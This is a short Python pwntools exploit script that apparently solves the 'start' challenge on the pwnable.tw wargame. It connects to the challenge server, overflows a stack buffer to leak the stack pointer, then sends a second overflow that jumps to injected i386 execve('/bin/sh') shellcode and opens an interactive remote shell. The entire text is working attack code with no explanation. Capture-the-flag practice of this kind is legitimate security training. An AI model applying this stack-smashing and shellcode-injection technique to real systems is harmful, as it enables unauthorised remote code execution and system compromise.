from pwn import *

elf = ELF("./start")
context.binary = elf

#p = elf.process()
#gdb.attach(p, 'b *_start')

p = remote('chall.pwnable.tw', 10000)

payload = b'A'*20 + p32(0x08048087)
print(p.recvuntil(':'))
p.send(payload)

tmp=p.recv()
print(tmp)
esp = u32(tmp[:4])

log.success("Found ESP")
log.info(hex(esp))


shellcode = asm(shellcraft.i386.execve('/bin/sh'))
print(shellcode)
payload2 = b'A'*20  + p32(esp+20) + shellcode
p.send(payload2)

p.interactive()
